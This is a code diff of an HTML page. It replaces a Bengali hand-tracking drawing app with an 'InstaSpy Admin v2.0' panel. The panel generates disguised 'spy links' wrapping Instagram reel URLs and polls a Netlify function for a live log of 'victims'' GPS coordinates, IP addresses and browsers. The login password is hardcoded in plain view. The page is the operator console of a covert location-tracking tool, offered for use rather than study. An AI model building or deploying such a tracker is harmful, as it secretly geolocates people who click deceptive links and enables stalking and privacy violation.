@@ -3,31 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Neon Hand Writer</title>
-    <link rel="stylesheet" href="style.css">
-    
-    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/drawing_utils/drawing_utils.js" crossorigin="anonymous"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
+    <title>🔐 InstaSpy Admin</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:#000;color:#fff;min-height:100vh}.container{max-width:500px;margin:0 auto;padding:40px 20px}h1{text-align:center;margin-bottom:30px}input[type="password"],input[type="url"]{width:100%;padding:15px;border:none;border-radius:8px;font-size:16px;margin-bottom:15px;background:#333;color:#fff}button{width:100%;padding:15px;background:linear-gradient(45deg,#f09433,#e6683c);border:none;border-radius:8px;color:white;font-size:16px;font-weight:700;cursor:pointer;margin:10px 0}button:hover{opacity:.9}.tracking-link{background:#28a745;padding:20px;border-radius:12px;margin:20px 0;word-break:break-all;font-family:monospace;font-size:14px}.admin-section{display:none;background:#111;padding:30px;border-radius:12px}.location-log{background:#1a1a1a;padding:20px;border-radius:8px;max-height:500px;overflow-y:auto;font-family:monospace;font-size:12px;line-height:1.4}.log-entry{padding:10px;margin:5px 0;background:#333;border-radius:6px}.map-link{color:#1da1f2;text-decoration:none}.map-link:hover{text-decoration:underline}.loading{text-align:center;padding:20px;color:#ccc}
+    </style>
 </head>
 <body>
-    <div class="app-container">
-        <canvas id="paint_canvas"></canvas>
-        
-        <div class="ui-overlay">
-            <h1>নিয়ন হ্যান্ড রাইটার</h1>
-            <p id="status">ক্যামেরা লোড হচ্ছে...</p>
-            <div class="controls">
-                <input type="color" id="colorPicker" value="#00ffff">
-                <button id="clearBtn">মুছে ফেলুন (Clear)</button>
+    <div class="container">
+        <h1>🔐 InstaSpy Admin v2.0</h1>
+        <input type="password" id="adminPass" placeholder="Password: soumikde2.0.1">
+        <button onclick="adminLogin()">Login</button>
+
+        <div id="adminSection" class="admin-section">
+            <h2>📱 Generate Spy Link</h2>
+            <input type="url" id="instaUrl" placeholder="https://www.instagram.com/reel/ABC123/">
+            <button onclick="generateSpyLink()">🎯 Create Spy Link</button>
+            <div id="spyLinkContainer" style="display:none;">
+                <div id="spyLink" class="tracking-link"></div>
+                <button onclick="copySpyLink()">📋 Copy Link</button>
             </div>
-            <p class="instruction">ইন্সট্রাকশন: তর্জনী ও বুড়ো আঙুল একসাথে জোড়া লাগিয়ে (Pinch করে) স্ক্রিনে লিখুন।</p>
+
+            <h3 style="margin-top:40px">📍 Real-time Location Tracker</h3>
+            <div id="logs" class="location-log"><div class="loading">Login to see live tracking...</div></div>
+            <button onclick="loadLogs()">🔄 Refresh Logs</button>
         </div>
-        
-        <video id="input_video" style="display:none;"></video>
-        <canvas id="webcam_canvas" class="webcam-preview"></canvas>
     </div>
 
-    <script src="script.js"></script>
+    <script>
+        const API_BASE = '/.netlify/functions'; // Netlify Functions endpoint
+        
+        function adminLogin(){
+            if(document.getElementById('adminPass').value==='soumikde2.0.1'){
+                document.getElementById('adminSection').style.display='block';
+                document.getElementById('adminPass').style.display='none';
+                loadLogs();
+                setInterval(loadLogs,5000); // Auto refresh every 5s
+            }else alert('❌ Wrong Password!');
+        }
+
+        function generateSpyLink(){
+            const url=document.getElementById('instaUrl').value;
+            if(!url) return alert('Enter Instagram URL!');
+            const spyId='spy_'+Math.random().toString(36).substr(2,9);
+            const spyUrl=`${window.location.origin}/spy.html?id=${spyId}&url=${encodeURIComponent(url)}`;
+            
+            document.getElementById('spyLink').innerHTML=`🔗 <strong>${spyUrl}</strong>`;
+            document.getElementById('spyLinkContainer').style.display='block';
+            
+            // Save spy config
+            fetch(`${API_BASE}/track`,{
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({id:spyId,action:'save_spy',url:url})
+            });
+        }
+
+        function copySpyLink(){
+            navigator.clipboard.writeText(document.getElementById('spyLink').textContent).then(()=>alert('✅ Copied!'));
+        }
+
+        async function loadLogs(){
+            try{
+                const res=await fetch(`${API_BASE}/get-logs`);
+                const logs=await res.json();
+                const container=document.getElementById('logs');
+                if(logs.length){
+                    container.innerHTML=logs.map(log=>`
+                        <div class="log-entry">
+                            <strong>${log.timestamp}</strong> | 
+                            📍 <a href="https://maps.google.com/?q=${log.lat},${log.lon}" target="_blank" class="map-link">${log.lat}, ${log.lon}</a> 
+                            (acc: ${log.accuracy}m)<br>
+                            <small>ID: ${log.id} | IP: ${log.ip} | ${log.userAgent.substring(0,50)}...</small>
+                        </div>
+                    `).join('');
+                }else{
+                    container.innerHTML='<div class="loading">No victims yet... Share spy links! 👀</div>';
+                }
+            }catch(e){
+                document.getElementById('logs').innerHTML='<div class="loading">Loading...</div>';
+            }
+        }
+    </script>
 </body>
 </html>
